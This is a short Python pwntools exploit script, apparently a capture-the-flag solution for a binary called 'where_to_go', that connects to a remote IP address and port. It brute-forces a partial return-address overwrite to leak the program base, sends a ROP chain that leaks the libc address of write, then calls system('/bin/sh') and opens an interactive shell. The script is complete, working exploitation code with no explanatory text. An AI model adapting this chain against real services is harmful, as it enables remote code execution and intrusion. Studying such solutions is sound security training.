from pwn import *

while True:
    #p = process("./where_to_go",env={"LD_PRELOAD" : "./libc.so.6"})
    p = remote("35.223.244.247", 49155)
    p.recvline()
    p.send("A"*40 + "\x99\x28")
    try:
        leak = p.recv().split()
        break
    except:
        p.close()

main = u64(leak[0][:6].ljust(8, "\x00"))
base = main - 0x7da
write = base + 0x680
write_got = base + 0x200fb8
pop_rdi = base + 0x943
pop_rsi_r15 = base + 0x941
ret = base + 0x898

p.sendline("A"*40 + p64(ret) + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write) + p64(main))

sleep(1)
leak = p.recv().split("\x00")
write_leak = u64(leak[0][7:].ljust(8, "\x00"))
libc_base = write_leak - 0x110210
system = libc_base + 0x4f550
binsh = libc_base + 0x1b3e1a

p.sendline("A"*40 + p64(pop_rdi) + p64(binsh) + p64(system))
p.interactive()
